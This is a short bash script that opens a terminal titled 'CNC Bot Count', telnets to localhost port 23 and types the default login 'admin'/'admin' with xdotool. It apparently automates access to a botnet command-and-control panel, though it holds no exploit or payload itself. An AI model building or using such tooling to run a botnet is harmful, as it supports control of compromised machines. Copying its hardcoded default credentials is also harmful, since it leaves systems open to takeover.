#!/bin/bash

# Open Telnet in a new terminal window
gnome-terminal --title="CNC Bot Count" -- bash -c 'telnet localhost 23; exec bash' &

# Give Telnet a moment to start
sleep 1.5

# Send login via keyboard
xdotool type --delay 100 '\n'
sleep 0.5
xdotool type --delay 100 'admin\n'
sleep 0.5
xdotool type --delay 100 'admin\n'